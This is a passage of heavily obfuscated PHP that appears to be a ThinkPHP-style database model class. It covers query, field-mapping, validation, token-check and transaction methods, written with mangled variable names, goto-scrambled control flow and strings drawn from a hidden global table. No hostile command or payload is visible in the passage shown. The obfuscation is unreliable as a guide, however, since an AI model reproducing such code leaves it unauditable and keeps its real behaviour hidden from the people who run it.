$CšÕÀ¦Ğ÷‹])) { $aÀÉ­Ş‡• = strtolower($this->fields[$eêİ®ó×[251]][$CšÕÀ¦Ğ÷‹]); if (!1 !== strpos($aÀÉ­Ş‡•, $eêİ®ó×[285])) { } elseif (!1 === strpos($aÀÉ­Ş‡•, $eêİ®ó×[286]) && !1 !== strpos($aÀÉ­Ş‡•, $eêİ®ó×[287])) { $b…óãêËÄ[$CšÕÀ¦Ğ÷‹] = intval($b…óãêËÄ[$CšÕÀ¦Ğ÷‹]); } elseif (!1 !== strpos($aÀÉ­Ş‡•, $eêİ®ó×[288]) || !1 !== strpos($aÀÉ­Ş‡•, $eêİ®ó×[289])) { $b…óãêËÄ[$CšÕÀ¦Ğ÷‹] = floatval($b…óãêËÄ[$CšÕÀ¦Ğ÷‹]); } elseif (!1 !== strpos($aÀÉ­Ş‡•, $eêİ®ó×[290])) { $b…óãêËÄ[$CšÕÀ¦Ğ÷‹] = (bool) $b…óãêËÄ[$CšÕÀ¦Ğ÷‹]; } } } public function find($Cïƒ‘Â‡òŒ = array()) { goto D¼ô”´ÁéÒ; e‡™æõÔŞ: $Cïƒ‘Â‡òŒ = $this->_parseOptions(); $D‰Ä¿˜Æ¥¯ = $this->db->select($Cïƒ‘Â‡òŒ); if (!1 === $D‰Ä¿˜Æ¥¯) { return !1; } goto DÀ¡İí¸Ò; D¼ô”´ÁéÒ: $A‚á ´…´ =& $_SERVER[°Óó£ÌİóèÅ]; if (is_numeric($Cïƒ‘Â‡òŒ) || is_string($Cïƒ‘Â‡òŒ)) { $f¯ˆ¡Ÿ˜¬[$this->getPk()] = $Cïƒ‘Â‡òŒ; $this->options[$A‚á ´…´[274]] = $f¯ˆ¡Ÿ˜¬; } $this->options[$A‚á ´…´[291]] = 1; goto e‡™æõÔŞ; b°ù¦—Şä¼: if (!empty($this->options[$A‚á ´…´[292]])) { return $this->returnResult($this->data, $this->options[$A‚á ´…´[292]]); } return $this->data; goto B©’œ¾İõ; DÀ¡İí¸Ò: if (empty($D‰Ä¿˜Æ¥¯)) { return null; } $this->data = $D‰Ä¿˜Æ¥¯[0]; $this->_afterFind($this->data, $Cïƒ‘Â‡òŒ); goto b°ù¦—Şä¼; B©’œ¾İõ: } protected function _afterFind(&$b¦Íº»äö¶, $b»’«õ’Ê) { } protected function returnResult($e¤³İ†Â×ã, $dÈ‰ÆÃ»¨ = '') { $CÓÈšÊ‡—° =& $_SERVER[°Óó£ÌİóèÅ]; if ($dÈ‰ÆÃ»¨) { if (is_callable($dÈ‰ÆÃ»¨)) { return call_user_func($dÈ‰ÆÃ»¨, $e¤³İ†Â×ã); } switch (strtolower($dÈ‰ÆÃ»¨)) { case $CÓÈšÊ‡—°[293]: return json_encode($e¤³İ†Â×ã); case $CÓÈšÊ‡—°[294]: return xml_encode($e¤³İ†Â×ã); } } return $e¤³İ†Â×ã; } public function parseFieldsMap($EİÃÂÏ‘Öò, $BçÌƒÏ»Ç‘ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $FÜ•ÍÆƒã => $b¯¾ºµ„«’) { if ($BçÌƒÏ»Ç‘ == 1) { if (isset($EİÃÂÏ‘Öò[$b¯¾ºµ„«’])) { $EİÃÂÏ‘Öò[$FÜ•ÍÆƒã] = $EİÃÂÏ‘Öò[$b¯¾ºµ„«’]; unset($EİÃÂÏ‘Öò[$b¯¾ºµ„«’]); } } else { if (isset($EİÃÂÏ‘Öò[$FÜ•ÍÆƒã])) { $EİÃÂÏ‘Öò[$b¯¾ºµ„«’] = $EİÃÂÏ‘Öò[$FÜ•ÍÆƒã]; unset($EİÃÂÏ‘Öò[$FÜ•ÍÆƒã]); } } } } return $EİÃÂÏ‘Öò; } public function setField($F¸ëÆï±Ïµ, $Eİ”‹ÔÛµ™ = '') { if (is_array($F¸ëÆï±Ïµ)) { $fÊ¿¢¤ÀÈè = $F¸ëÆï±Ïµ; } else { $fÊ¿¢¤ÀÈè[$F¸ëÆï±Ïµ] = $Eİ”‹ÔÛµ™; } return $this->save($fÊ¿¢¤ÀÈè); } public function setAdd($e·Š¿É‘İÈ, $Aø´Üçœñ¬ = 1) { $D½æô£Œ¢ =& $_SERVER[°Óó£ÌİóèÅ]; $cœÎ‘äÜ¡Ÿ = $e·Š¿É‘İÈ . $D½æô£Œ¢[295] . $Aø´Üçœñ¬; if ($Aø´Üçœñ¬ < 0) { $cœÎ‘äÜ¡Ÿ = $e·Š¿É‘İÈ . $Aø´Üçœñ¬; } return $this->setField($e·Š¿É‘İÈ, array($D½æô£Œ¢[296], $cœÎ‘äÜ¡Ÿ)); } public function getField($A¢±››²´•, $bÒ÷£×•°ß = null) { $Cİ¾Ë—Ø· =& $_SERVER[°Óó£ÌİóèÅ]; $F¯î‡Œô®¾[$Cİ¾Ë—Ø·[272]] = $A¢±››²´•; $F¯î‡Œô®¾ = $this->_parseOptions($F¯î‡Œô®¾); $A¢±››²´• = trim($A¢±››²´•); if (strpos($A¢±››²´•, $Cİ¾Ë—Ø·[47])) { if (!isset($F¯î‡Œô®¾[$Cİ¾Ë—Ø·[291]])) { $F¯î‡Œô®¾[$Cİ¾Ë—Ø·[291]] = is_numeric($bÒ÷£×•°ß) ? $bÒ÷£×•°ß : $Cİ¾Ë—Ø·[33]; } $a•óÛí¥é = $this->db->select($F¯î‡Œô®¾); if (!empty($a•óÛí¥é)) { goto bã´©¶â—; d˜ß¬çïˆ³: $CõÚÊ’§µì = array_shift($A¢±››²´•); $aåÇ‚Á¸ğÇ = array(); $a—Àİ£†¼× = count($dÁçœ…™‡›); goto A“‹¡Íö„¾; A“‹¡Íö„¾: foreach ($a•óÛí¥é as $aåñ·Úòİ) { $AˆÂå©Šõ® = $aåñ·Úòİ[$EÍ„é»óËƒ]; if (2 == $a—Àİ£†¼×) { $aåÇ‚Á¸ğÇ[$AˆÂå©Šõ®] = $aåñ·Úòİ[$CõÚÊ’§µì]; } else { $aåÇ‚Á¸ğÇ[$AˆÂå©Šõ®] = is_string($bÒ÷£×•°ß) ? implode($bÒ÷£×•°ß, $aåñ·Úòİ) : $aåñ·Úòİ; } } return $aåÇ‚Á¸ğÇ; goto E¶­†î•Ù; bã´©¶â—: $dÁçœ…™‡› = explode($Cİ¾Ë—Ø·[47], $A¢±››²´•); $A¢±››²´• = array_keys($a•óÛí¥é[0]); $EÍ„é»óËƒ = array_shift($A¢±››²´•); goto d˜ß¬çïˆ³; E¶­†î•Ù: } } else { if (!0 !== $bÒ÷£×•°ß) { $F¯î‡Œô®¾[$Cİ¾Ë—Ø·[291]] = is_numeric($bÒ÷£×•°ß) ? $bÒ÷£×•°ß : 1; } if ($bÒ÷£×•°ß === $Cİ¾Ë—Ø·[254]) { unset($F¯î‡Œô®¾[$Cİ¾Ë—Ø·[291]]); } $aåñ·Úòİ = $this->db->select($F¯î‡Œô®¾); if (!empty($aåñ·Úòİ)) { if ($bÒ÷£×•°ß === $Cİ¾Ë—Ø·[254]) { return reset($aåñ·Úòİ[0]); } if (!0 !== $bÒ÷£×•°ß && 1 == $F¯î‡Œô®¾[$Cİ¾Ë—Ø·[291]]) { return reset($aåñ·Úòİ[0]); } foreach ($aåñ·Úòİ as $FÁ²…µ¿ğ’) { $Bà•¸ËÏğ[] = $FÁ²…µ¿ğ’[$A¢±››²´•]; } return $Bà•¸ËÏğ; } } return null; } public function create($a¼ ÂóË = '', $EÅÕ¯ÌöÏ = '') { goto eƒç´ò¾ÅÆ; C©Íà¸¿ôİ: if ($this->autoCheckFields) { $aªêæ«¿”³ = $this->getDbFields(); foreach ($a¼ ÂóË as $Cª®«ë¥¬ä => $B†è™çÏÀÙ) { if (!in_array($Cª®«ë¥¬ä, $aªêæ«¿”³)) { unset($a¼ ÂóË[$Cª®«ë¥¬ä]); } elseif (MAGIC_QUOTES_GPC && is_string($B†è™çÏÀÙ)) { $a¼ ÂóË[$Cª®«ë¥¬ä] = stripslashes($B†è™çÏÀÙ); } } } $this->autoOperation($a¼ ÂóË, $EÅÕ¯ÌöÏ); $this->data = $a¼ ÂóË; goto eÛ“ª„š½ß; d¥î…Íƒ: $a¼ ÂóË = $this->parseFieldsMap($a¼ ÂóË, 0); $EÅÕ¯ÌöÏ = $EÅÕ¯ÌöÏ ? $EÅÕ¯ÌöÏ : (!empty($a¼ ÂóË[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$EôÑ÷´æŒä[272]])) { $aªêæ«¿”³ = $this->options[$EôÑ÷´æŒä[272]]; unset($this->options[$EôÑ÷´æŒä[272]]); } elseif ($EÅÕ¯ÌöÏ == THINK_MODEL_INSERT && isset($this->insertFields)) { $aªêæ«¿”³ = $this->insertFields; } elseif ($EÅÕ¯ÌöÏ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $aªêæ«¿”³ = $this->updateFields; } goto c¾ÀÛñ¼ˆà; c¾ÀÛñ¼ˆà: if (isset($aªêæ«¿”³)) { if (is_string($aªêæ«¿”³)) { $aªêæ«¿”³ = explode($EôÑ÷´æŒä[47], $aªêæ«¿”³); } if (think_config($EôÑ÷´æŒä[297])) { $aªêæ«¿”³[] = think_config($EôÑ÷´æŒä[298]); } foreach ($a¼ ÂóË as $Cª®«ë¥¬ä => $B†è™çÏÀÙ) { if (!in_array($Cª®«ë¥¬ä, $aªêæ«¿”³)) { unset($a¼ ÂóË[$Cª®«ë¥¬ä]); } } } if (!$this->autoValidation($a¼ ÂóË, $EÅÕ¯ÌöÏ)) { return !1; } if (!$this->autoCheckToken($a¼ ÂóË)) { $this->error = think_lang($EôÑ÷´æŒä[299]); return !1; } goto C©Íà¸¿ôİ; eÛ“ª„š½ß: return $a¼ ÂóË; goto dÑÕ˜î¶; eƒç´ò¾ÅÆ: $EôÑ÷´æŒä =& $_SERVER[°Óó£ÌİóèÅ]; if (empty($a¼ ÂóË)) { $a¼ ÂóË = $_POST; } elseif (is_object($a¼ ÂóË)) { $a¼ ÂóË = get_object_vars($a¼ ÂóË); } if (empty($a¼ ÂóË) || !is_array($a¼ ÂóË)) { $this->error = think_lang($EôÑ÷´æŒä[270]); return !1; } goto d¥î…Íƒ; dÑÕ˜î¶: } public function autoCheckToken($DÀŒŞŠ›) { $D¡´Â‚šŒ“ =& $_SERVER[°Óó£ÌİóèÅ]; if (isset($this->options[$D¡´Â‚šŒ“[300]]) && !$this->options[$D¡´Â‚šŒ“[300]]) { return !0; } if (think_config($D¡´Â‚šŒ“[297])) { $D¢Ó¬­¾¯¾ = think_config($D¡´Â‚šŒ“[298]); if (!isset($DÀŒŞŠ›[$D¢Ó¬­¾¯¾]) || Session::get($D¢Ó¬­¾¯¾)) { return !1; } list($a‚ùâ„Ñ«, $BèÁµùƒÃ‰) = explode($D¡´Â‚šŒ“[79], $DÀŒŞŠ›[$D¢Ó¬­¾¯¾]); if ($BèÁµùƒÃ‰ && Session::get($D¢Ó¬­¾¯¾ . $D¡´Â‚šŒ“[100] . $a‚ùâ„Ñ«) === $BèÁµùƒÃ‰) { Session::remove($D¢Ó¬­¾¯¾ . $D¡´Â‚šŒ“[100] . $a‚ùâ„Ñ«); return !0; } if (think_config($D¡´Â‚šŒ“[301])) { Session::remove($D¢Ó¬­¾¯¾ . $D¡´Â‚šŒ“[100] . $a‚ùâ„Ñ«); } return !1; } return !0; } public function regex($c‘òæãøÕƒ, $DÆèØÂÒÁğ) { $Ağ™œ‹ğŠ =& $_SERVER[°Óó£ÌİóèÅ]; $AåÉ·Ú·ˆ¢ = array($Ağ™œ‹ğŠ[302] => $Ağ™œ‹ğŠ[303], $Ağ™œ‹ğŠ[304] => $Ağ™œ‹ğŠ[305], $Ağ™œ‹ğŠ[306] => $Ağ™œ‹ğŠ[307], $Ağ™œ‹ğŠ[308] => $Ağ™œ‹ğŠ[309], $Ağ™œ‹ğŠ[310] => $Ağ™œ‹ğŠ[311], $Ağ™œ‹ğŠ[312] => $Ağ™œ‹ğŠ[313], $Ağ™œ‹ğŠ[314] => $Ağ™œ‹ğŠ[315], $Ağ™œ‹ğŠ[289] => $Ağ™œ‹ğŠ[316], $Ağ™œ‹ğŠ[317] => $Ağ™œ‹ğŠ[318]); if (isset($AåÉ·Ú·ˆ¢[strtolower($DÆèØÂÒÁğ)])) { $DÆèØÂÒÁğ = $AåÉ·Ú·ˆ¢[strtolower($DÆèØÂÒÁğ)]; } return preg_match($DÆèØÂÒÁğ, $c‘òæãøÕƒ) === 1; } private function autoOperation(&$DÍÀ‘ÆŠŞé, $f¦¬Ø‡­ŒŸ) { $cÎ˜¢š¼½ =& $_SERVER[°Óó£ÌİóèÅ]; if (!empty($this->options[$cÎ˜¢š¼½[319]])) { $C¡‚—çñˆ› = $this->options[$cÎ˜¢š¼½[319]]; unset($this->options[$cÎ˜¢š¼½[319]]); } elseif (!empty($this->_auto)) { $C¡‚—çñˆ› = $this->_auto; } if (isset($C¡‚—çñˆ›)) { foreach ($C¡‚—çñˆ› as $BÒœ‹ÑİÉö) { if (empty($BÒœ‹ÑİÉö[2])) { $BÒœ‹ÑİÉö[2] = THINK_MODEL_INSERT; } if ($f¦¬Ø‡­ŒŸ == $BÒœ‹ÑİÉö[2] || $BÒœ‹ÑİÉö[2] == THINK_MODEL_BOTH) { switch (trim($BÒœ‹ÑİÉö[3])) { case $cÎ˜¢š¼½[320]: case $cÎ˜¢š¼½[321]: $c•ÙÓÒ©Ö³ = isset($BÒœ‹ÑİÉö[4]) ? (array) $BÒœ‹ÑİÉö[4] : array(); if (isset($DÍÀ‘ÆŠŞé[$BÒœ‹ÑİÉö[0]])) { array_unshift($c•ÙÓÒ©Ö³, $DÍÀ‘ÆŠŞé[$BÒœ‹ÑİÉö[0]]); } if ($cÎ˜¢š¼½[320] == $BÒœ‹ÑİÉö[3]) { $DÍÀ‘ÆŠŞé[$BÒœ‹ÑİÉö[0]] = call_user_func_array($BÒœ‹ÑİÉö[1], $c•ÙÓÒ©Ö³); } else { $DÍÀ‘ÆŠŞé[$BÒœ‹ÑİÉö[0]] = call_user_func_array(array(&$this, $BÒœ‹ÑİÉö[1]), $c•ÙÓÒ©Ö³); } break; case $cÎ˜¢š¼½[272]: $DÍÀ‘ÆŠŞé[$BÒœ‹ÑİÉö[0]] = $DÍÀ‘ÆŠŞé[$BÒœ‹ÑİÉö[1]]; break; case $cÎ˜¢š¼½[322]: if ($cÎ˜¢š¼½[33] === $DÍÀ‘ÆŠŞé[$BÒœ‹ÑİÉö[0]]) { unset($DÍÀ‘ÆŠŞé[$BÒœ‹ÑİÉö[0]]); } break; case $cÎ˜¢š¼½[323]: default: $DÍÀ‘ÆŠŞé[$BÒœ‹ÑİÉö[0]] = $BÒœ‹ÑİÉö[1]; } if (!1 === $DÍÀ‘ÆŠŞé[$BÒœ‹ÑİÉö[0]]) { unset($DÍÀ‘ÆŠŞé[$BÒœ‹ÑİÉö[0]]); } } } } return $DÍÀ‘ÆŠŞé; } protected function autoValidation($CÒé½¾ÕÒĞ, $eÜ¶‘‘„È¢) { $aö‰í¤Ğ¾· =& $_SERVER[°Óó£ÌİóèÅ]; if (!empty($this->options[$aö‰í¤Ğ¾·[324]])) { $D¼ŸÒÔ¡ğ = $this->options[$aö‰í¤Ğ¾·[324]]; unset($this->options[$aö‰í¤Ğ¾·[324]]); } elseif (!empty($this->_validate)) { $D¼ŸÒÔ¡ğ = $this->_validate; } if (isset($D¼ŸÒÔ¡ğ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($D¼ŸÒÔ¡ğ as $f‰ÔßøââÛ => $cİÎ©åì¾¹) { if (empty($cİÎ©åì¾¹[5]) || $cİÎ©åì¾¹[5] == THINK_MODEL_BOTH || $cİÎ©åì¾¹[5] == $eÜ¶‘‘„È¢) { if (0 == strpos($cİÎ©åì¾¹[2], $aö‰í¤Ğ¾·[325]) && strpos($cİÎ©åì¾¹[2], $aö‰í¤Ğ¾·[326])) { $cİÎ©åì¾¹[2] = think_lang(substr($cİÎ©åì¾¹[2], 2, -1)); } $cİÎ©åì¾¹[3] = isset($cİÎ©åì¾¹[3]) ? $cİÎ©åì¾¹[3] : THINK_EXISTS_VALIDATE; $cİÎ©åì¾¹[4] = isset($cİÎ©åì¾¹[4]) ? $cİÎ©åì¾¹[4] : $aö‰í¤Ğ¾·[327]; switch ($cİÎ©åì¾¹[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($CÒé½¾ÕÒĞ, $cİÎ©åì¾¹)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($aö‰í¤Ğ¾·[33] != trim($CÒé½¾ÕÒĞ[$cİÎ©åì¾¹[0]])) { if (!1 === $this->_validationField($CÒé½¾ÕÒĞ, $cİÎ©åì¾¹)) { return !1; } } break; default: if (isset($CÒé½¾ÕÒĞ[$cİÎ©åì¾¹[0]])) { if (!1 === $this->_validationField($CÒé½¾ÕÒĞ, $cİÎ©åì¾¹)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($eäøÂ…©Â®, $fÈîÓ•ˆ) { if (!1 === $this->_validationFieldItem($eäøÂ…©Â®, $fÈîÓ•ˆ)) { if ($this->patchValidate) { $this->error[$fÈîÓ•ˆ[0]] = $fÈîÓ•ˆ[2]; } else { $this->error = $fÈîÓ•ˆ[2]; return !1; } } return; } protected function _validationFieldItem($B ‹ò¶Éªš, $b™¸É¸æøÃ) { $a¹š“†‘·ô =& $_SERVER[°Óó£ÌİóèÅ]; switch (strtolower(trim($b™¸É¸æøÃ[4]))) { case $a¹š“†‘·ô[320]: case $a¹š“†‘·ô[321]: $A«’ÛåŸçß = isset($b™¸É¸æøÃ[6]) ? (array) $b™¸É¸æøÃ[6] : array(); if (is_string($b™¸É¸æøÃ[0]) && strpos($b™¸É¸æøÃ[0], $a¹š“†‘·ô[47])) { $b™¸É¸æøÃ[0] = explode($a¹š“†‘·ô[47], $b™¸É¸æøÃ[0]); } if (is_array($b™¸É¸æøÃ[0])) { foreach ($b™¸É¸æøÃ[0] as $dµÁÑºîï¾) { $f³«…Ä íµ[$dµÁÑºîï¾] = $B ‹ò¶Éªš[$dµÁÑºîï¾]; } array_unshift($A«’ÛåŸçß, $f³«…Ä íµ); } else { array_unshift($A«’ÛåŸçß, $B ‹ò¶Éªš[$b™¸É¸æøÃ[0]]); } if ($a¹š“†‘·ô[320] == $b™¸É¸æøÃ[4]) { return call_user_func_array($b™¸É¸æøÃ[1], $A«’ÛåŸçß); } else { return call_user_func_array(array(&$this, $b™¸É¸æøÃ[1]), $A«’ÛåŸçß); } case $a¹š“†‘·ô[328]: return $B ‹ò¶Éªš[$b™¸É¸æøÃ[0]] == $B ‹ò¶Éªš[$b™¸É¸æøÃ[1]]; case $a¹š“†‘·ô[329]: if (is_string($b™¸É¸æøÃ[0]) && strpos($b™¸É¸æøÃ[0], $a¹š“†‘·ô[47])) { $b™¸É¸æøÃ[0] = explode($a¹š“†‘·ô[47], $b™¸É¸æøÃ[0]); } $Eë«°—ğèÆ = array(); if (is_array($b™¸É¸æøÃ[0])) { foreach ($b™¸É¸æøÃ[0] as $dµÁÑºîï¾) { $Eë«°—ğèÆ[$dµÁÑºîï¾] = $B ‹ò¶Éªš[$dµÁÑºîï¾]; } } else { $Eë«°—ğèÆ[$b™¸É¸æøÃ[0]] = $B ‹ò¶Éªš[$b™¸É¸æøÃ[0]]; } if (!empty($B ‹ò¶Éªš[$this->getPk()])) { $Eë«°—ğèÆ[$this->getPk()] = array($a¹š“†‘·ô[330], $B ‹ò¶Éªš[$this->getPk()]); } if ($this->where($Eë«°—ğèÆ)->find()) { return !1; } return !0; default: return $this->check($B ‹ò¶Éªš[$b™¸É¸æøÃ[0]], $b™¸É¸æøÃ[1], $b™¸É¸æøÃ[4]); } } public function check($B²‘ÓÀÀÍ³, $bëÙøƒ¨Ä, $D¿ßõ±æ«ƒ = "\162\x65\147\145\170") { $bß×¿·äË‹ =& $_SERVER[°Óó£ÌİóèÅ]; $D¿ßõ±æ«ƒ = strtolower(trim($D¿ßõ±æ«ƒ)); switch ($D¿ßõ±æ«ƒ) { case $bß×¿·äË‹[7]: case $bß×¿·äË‹[331]: $dÕî½¢ˆíÙ = is_array($bëÙøƒ¨Ä) ? $bëÙøƒ¨Ä : explode($bß×¿·äË‹[47], $bëÙøƒ¨Ä); return $D¿ßõ±æ«ƒ == $bß×¿·äË‹[7] ? in_array($B²‘ÓÀÀÍ³, $dÕî½¢ˆíÙ) : !in_array($B²‘ÓÀÀÍ³, $dÕî½¢ˆíÙ); case $bß×¿·äË‹[332]: case $bß×¿·äË‹[333]: if (is_array($bëÙøƒ¨Ä)) { $CÛñê’Â»ù = $bëÙøƒ¨Ä[0]; $FÒÏä¨Ö“Ô = $bëÙøƒ¨Ä[1]; } else { list($CÛñê’Â»ù, $FÒÏä¨Ö“Ô) = explode($bß×¿·äË‹[47], $bëÙøƒ¨Ä); } return $D¿ßõ±æ«ƒ == $bß×¿·äË‹[332] ? $B²‘ÓÀÀÍ³ >= $CÛñê’Â»ù && $B²‘ÓÀÀÍ³ <= $FÒÏä¨Ö“Ô : $B²‘ÓÀÀÍ³ < $CÛñê’Â»ù || $B²‘ÓÀÀÍ³ > $FÒÏä¨Ö“Ô; case $bß×¿·äË‹[334]: case $bß×¿·äË‹[335]: return $D¿ßõ±æ«ƒ == $bß×¿·äË‹[334] ? $B²‘ÓÀÀÍ³ == $bëÙøƒ¨Ä : $B²‘ÓÀÀÍ³ != $bëÙøƒ¨Ä; case $bß×¿·äË‹[336]: $cˆµ“á³ÛÂ = mb_strlen($B²‘ÓÀÀÍ³, $bß×¿·äË‹[337]); if (strpos($bëÙøƒ¨Ä, $bß×¿·äË‹[47])) { list($CÛñê’Â»ù, $FÒÏä¨Ö“Ô) = explode($bß×¿·äË‹[47], $bëÙøƒ¨Ä); return $cˆµ“á³ÛÂ >= $CÛñê’Â»ù && $cˆµ“á³ÛÂ <= $FÒÏä¨Ö“Ô; } else { return $cˆµ“á³ÛÂ == $bëÙøƒ¨Ä; } case $bß×¿·äË‹[338]: list($FìÒò”¹ÙÖ, $dÀ­Ş¼àøĞ) = explode($bß×¿·äË‹[47], $bëÙøƒ¨Ä); if (!is_numeric($FìÒò”¹ÙÖ)) { $FìÒò”¹ÙÖ = strtotime($FìÒò”¹ÙÖ); } if (!is_numeric($dÀ­Ş¼àøĞ)) { $dÀ­Ş¼àøĞ = strtotime($dÀ­Ş¼àøĞ); } return NOW_TIME >= $FìÒò”¹ÙÖ && NOW_TIME <= $dÀ­Ş¼àøĞ; case $bß×¿·äË‹[339]: return in_array(get_client_ip(), explode($bß×¿·äË‹[47], $bëÙøƒ¨Ä)); case $bß×¿·äË‹[340]: return !in_array(get_client_ip(), explode($bß×¿·äË‹[47], $bëÙøƒ¨Ä)); case $bß×¿·äË‹[327]: default: return $this->regex($B²‘ÓÀÀÍ³, $bëÙøƒ¨Ä); } } public function query($f´ŸŒ¡, $e—àŸìè = false) { $BÌãˆ¦ÍÎ =& $_SERVER[°Óó£ÌİóèÅ]; if (!is_bool($e—àŸìè) && !is_array($e—àŸìè)) { $e—àŸìè = func_get_args(); array_shift($e—àŸìè); } $f´ŸŒ¡ = str_replace(array($BÌãˆ¦ÍÎ[61], $BÌãˆ¦ÍÎ[341]), $BÌãˆ¦ÍÎ[50], $f´ŸŒ¡); $f´ŸŒ¡ = $this->parseSql($f´ŸŒ¡, $e—àŸìè); return $this->db->query($f´ŸŒ¡); } public function execute($A”¾‰‹²Ù², $c„ê”ÍàÍ’ = false) { if (!is_bool($c„ê”ÍàÍ’) && !is_array($c„ê”ÍàÍ’)) { $c„ê”ÍàÍ’ = func_get_args(); array_shift($c„ê”ÍàÍ’); } $A”¾‰‹²Ù² = $this->parseSql($A”¾‰‹²Ù², $c„ê”ÍàÍ’); return $this->db->execute($A”¾‰‹²Ù²); } protected function parseSql($Bö´ ó–Èµ, $D½¾Æòä¥) { $eÎİ…š˜ğ¥ =& $_SERVER[°Óó£ÌİóèÅ]; if (!0 === $D½¾Æòä¥) { $aâ“åÓíÄ = $this->_parseOptions(); $Bö´ ó–Èµ = $this->db->parseSql($Bö´ ó–Èµ, $aâ“åÓíÄ); } elseif (is_array($D½¾Æòä¥)) { $D½¾Æòä¥ = array_map(array($this->db, $eÎİ…š˜ğ¥[342]), $D½¾Æòä¥); $Bö´ ó–Èµ = vsprintf($Bö´ ó–Èµ, $D½¾Æòä¥); } else { $Bö´ ó–Èµ = strtr($Bö´ ó–Èµ, array($eÎİ…š˜ğ¥[343] => $this->getTableName(), $eÎİ…š˜ğ¥[344] => think_config($eÎİ…š˜ğ¥[243]))); } $this->db->setModel($this->name); return $Bö´ ó–Èµ; } public function db($BëŠŠéĞï = '', $e îÓ›Ğ¤ = '', $A»ÀŒë “Ä = array()) { goto d¢Á¿ÖŒ‘ó; Fßã–¿ë•Ÿ: static $E˜‘ î£Ôñ = array(); if (!isset($E˜‘ î£Ôñ[$BëŠŠéĞï]) || isset($E˜‘ î£Ôñ[$BëŠŠéĞï]) && $e îÓ›Ğ¤ && $FÅÅ‘¸éÙÒ[$BëŠŠéĞï] != $e îÓ›Ğ¤) { if (!empty($e îÓ›Ğ¤) && is_string($e îÓ›Ğ¤) && !1 === strpos($e îÓ›Ğ¤, $FÃ¨İš•ç[8])) { $e îÓ›Ğ¤ = think_config($e îÓ›Ğ¤); } $E˜‘ î£Ôñ[$BëŠŠéĞï] = Db::getInstance($e îÓ›Ğ¤); } elseif (NULL === $e îÓ›Ğ¤) { $E˜‘ î£Ôñ[$BëŠŠéĞï]->close(); unset($E˜‘ î£Ôñ[$BëŠŠéĞï]); return; } if (!empty($A»ÀŒë “Ä)) { if (is_string($A»ÀŒë “Ä)) { parse_str($A»ÀŒë “Ä, $A»ÀŒë “Ä); } foreach ($A»ÀŒë “Ä as $B‰÷Ó‚ïºÌ => $aªë³ÆÉî) { $this->setProperty($B‰÷Ó‚ïºÌ, $aªë³ÆÉî); } } goto e¥™¹±ªÂÃ; e¥™¹±ªÂÃ: $FÅÅ‘¸éÙÒ[$BëŠŠéĞï] = $e îÓ›Ğ¤; $this->db = $E˜‘ î£Ôñ[$BëŠŠéĞï]; $this->_after_db(); goto fùÇ›Öàì¶; fùÇ›Öàì¶: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto CŠì¼ôªßÛ; d¢Á¿ÖŒ‘ó: $FÃ¨İš•ç =& $_SERVER[°Óó£ÌİóèÅ]; if ($FÃ¨İš•ç[33] === $BëŠŠéĞï && $this->db) { return $this->db; } static $FÅÅ‘¸éÙÒ = array(); goto Fßã–¿ë•Ÿ; CŠì¼ôªßÛ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $e¬Ø¡‰İï² = get_class($this); if ($e¬Ø¡‰İï² == $_SERVER[°Óó£ÌİóèÅ][345]) { return $this->name; } $this->name = substr($e¬Ø¡‰İï², 0, -5); } return $this->name; } public function getTableName() { $EÊºá¶†ãÄ =& $_SERVER[°Óó£ÌİóèÅ]; if (empty($this->trueTableName)) { $A…–óÆ®¸Ã = !empty($this->tablePrefix) ? $this->tablePrefix : $EÊºá¶†ãÄ[33]; if (!empty($this->tableName)) { $A…–óÆ®¸Ã .= $this->tableName; } else { $A…–óÆ®¸Ã .= think_parse_name($this->name); } $this->trueTableName = strtolower($A…–óÆ®¸Ã); } return (!empty($this->dbName) ? $this->dbName . $EÊºá¶†ãÄ[100] : $EÊºá¶†ãÄ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $eªï–‘´˜ì =& $_SERVER[°Óó£ÌİóèÅ]; return isset($this->fields[$eªï–‘´˜ì[250]]) ? $this->fields[$eªï–‘´˜ì[250]] : $this->pk; } public function getDbFields() { $bà¡¹Ü°• =& $_SERVER[°Óó£ÌİóèÅ]; if (isset($this->options[$bà¡¹Ü°•[278]])) { $DÉÉØíÛƒ = $this->db->getFields($this->options[$bà¡¹Ü°•[278]]); return $DÉÉØíÛƒ ? array_keys($DÉÉØíÛƒ) : !1; } if ($this->fields) { $DÉÉØíÛƒ = $this->fields; unset($DÉÉØíÛƒ[$bà¡¹Ü°•[249]], $DÉÉØíÛƒ[$bà¡¹Ü°•[250]], $DÉÉØíÛƒ[$bà¡¹Ü°•[251]], $DÉÉØíÛƒ[$bà¡¹Ü°•[248]]); return $DÉÉØíÛƒ; } return !1; } public function data($A†œÛ›·Œ = '') { $eèİØõê³¬ =& $_SERVER[°Óó£ÌİóèÅ]; if ($eèİØõê³¬[33] === $A†œÛ›·Œ && !empty($this->data)) { return $this->data; } if (is_object($A†œÛ›·Œ)) { $A†œÛ›·Œ = get_object_vars($A†œÛ›·Œ); } elseif (is_string($A†œÛ›·Œ)) { parse_str($A†œÛ›·Œ, $A†œÛ›·Œ); } elseif (!is_array($A†œÛ›·Œ)) { think_exception(think_lang($eèİØõê³¬[270])); } $this->data = $A†œÛ›·Œ; return $this; } public function join($Cäİõ°µ«) { $dÏ³®‚àâ¶ =& $_SERVER[°Óó£ÌİóèÅ]; if (is_array($Cäİõ°µ«)) { $this->options[$dÏ³®‚àâ¶[281]] = $Cäİõ°µ«; } elseif (!empty($Cäİõ°µ«)) { $this->options[$dÏ³®‚àâ¶[281]][] = $Cäİõ°µ«; } return $this; } public function union($f½«„ÒÅÌó, $DÓªïŒŠó¬ = false) { goto C‘²é÷¼ ß; eÓ…ƒòƒ§¥: if (is_object($f½«„ÒÅÌó)) { 